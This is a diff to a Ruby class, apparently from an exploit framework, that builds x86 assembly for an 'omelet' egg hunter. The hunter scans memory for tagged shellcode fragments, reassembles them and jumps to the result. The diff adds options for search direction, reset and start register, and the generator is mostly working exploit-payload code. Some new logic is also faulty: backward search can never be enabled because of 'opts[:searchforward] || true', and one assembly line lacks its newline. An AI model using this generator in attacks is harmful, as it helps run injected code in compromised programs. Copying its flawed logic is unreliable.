@@ -79,7 +79,14 @@ class Omelet
 		#
 		# This method generates an eggs-to-omelet hunter using the derived hunter stub.
 		#
-		def generate(payload, badchars = '', eggsize = 123, eggtag = "00w")
+		def generate(payload, badchars = '', opts = {})
+
+			eggsize       = opts[:eggsize] || 123
+			eggtag        = opts[:eggtag] || "00w"
+			searchforward = opts[:searchforward] || true
+			reset         = opts[:reset] || false
+			startreg      = opts[:startreg]
+
 			return nil if ((opts = hunter_stub) == nil)
 
 			# calculate number of eggs
@@ -94,21 +101,67 @@ class Omelet
 			nr_eggs_hex = "%02x" % nr_eggs
 			eggsize_hex = "%02x" % eggsize
 
-			hextag = ""
+			hextag = ''
 			eggtag.split('').each do | thischar |
 				decchar = "%02x" % thischar[0]
 				hextag = decchar + hextag
 			end
 			hextag = hextag + "01"
 
-			# create omelet code
+			# search forward or backward ?
+			setflag      = nil
+			searchstub1  = nil
+			searchstub2  = nil
+			flipflagpre  = ''
+			flipflagpost = ''
 
+			if searchforward
+				# clear direction flag
+				setflag     = "cld\n"
+				searchstub1 = "dec edx\n" * 4
+				searchstub2 = "inc edx\n"
+			else
+				# set the direction flag
+				setflag      = "std"
+				searchstub1  = "inc edx\n" * 4
+				searchstub2  = "dec edx\n"
+				flipflagpre  = "cld\nsub esi,-8\n"
+				flipflagpost = "std\n"
+			end
+
+			# prepare the stub that starts the search
+			startstub = ''
+			if startreg
+				if startreg.downcase != 'ebp'
+					startstub << "mov ebp,#{startreg}\n"
+				end
+				startstub << "mov edx,ebp\n"
+			end
+			# a register will be used as start location for the search
+			startstub << "push esp\n" + "pop edi\n" + "or di,0xffff\n"
+			# edx will be used, start at end of stack frame
+			if not startreg
+				startstub << "mov edx,edi\n"
+				if reset
+					startstub << "push edx\n" + "pop ebp\n"
+				end
+			end
+
+			# reset start after each egg was found ?
+			# will allow to find eggs when they are out of order/sequence
+			resetstart = ''
+			if reset
+				resetstart = "push ebp\n" + "pop edx\n"
+			end 
+
+			# create omelet code
 			omelet_hunter = <<EOS
 
 	nr_eggs equ 0x#{nr_eggs_hex}	; number of eggs
 	egg_size equ 0x#{eggsize_hex} 	; nr bytes of payload per egg
 	hex_tag equ 0x#{hextag}		; tag
 	
+	#{setflag}			; set direction flag
 	jmp start
 	
 	; routine to calculate the target location 
@@ -117,12 +170,9 @@ class Omelet
 	; First, I'll make EDI point to end of stack
 	; and I'll put the number of shellcode eggs in eax
 get_target_loc:
-	push esp		   ; get stack pointer and put it in EDI
-	pop edi        ; set EDI to end of stack
-	or di,0xffff	; edi=0x....ffff = end of current stack frame
-	mov edx,edi		; use edx as start location for the search
+	#{startstub}		; use edx as start location for the search
 	xor eax,eax		; zero eax
-	mov al,nr_eggs	; put number of eggs in eax
+	mov al,nr_eggs		; put number of eggs in eax
 	
 calc_target_loc:
 	xor esi,esi		; use esi as counter to step back
@@ -150,15 +200,10 @@ start:
 	jmp search_next_address
 	
 find_egg:
-	dec edx	 ; scasd does edx+4, so dec edx 4 times
-	          ; + inc edx one time
-				 ; to make sure we don't miss any pointers
-	dec edx
-	dec edx
-	dec edx
+	#{searchstub1}		; based on search direction
 	
 search_next_address:
-	inc edx		; next ptr 
+	#{searchstub2}		; based on search direction
 	push edx		; save edx
 	push 0x02
 	pop eax		; set eax to 0x02
@@ -180,14 +225,18 @@ copy_egg:
 	mov esi,edx		; set ESI = EDX (needed for rep instruction)
 	xor ecx,ecx
 	mov cl,egg_size	; set copy counter
+	#{flipflagpre}		; flip destination flag if necessary
 	rep movsb		; copy egg from ESI to EDI
+	#{flipflagpost}		; flip destination flag again if necessary
 	dec ebx		; decrement egg
+	#{resetstart}		; reset start location if necessary
 	cmp bl,1		; found all eggs ?
 	jnz find_egg		; no = look for next egg
 	; done - all eggs have been found and copied
 	
 done:
 	call get_target_loc	; re-calculate location where recombined shellcode is placed
+	cld
 	jmp edi		; and jump to it :)
 EOS
 
@@ -228,6 +277,5 @@ protected
 	end
 
 end
-
 end
 end
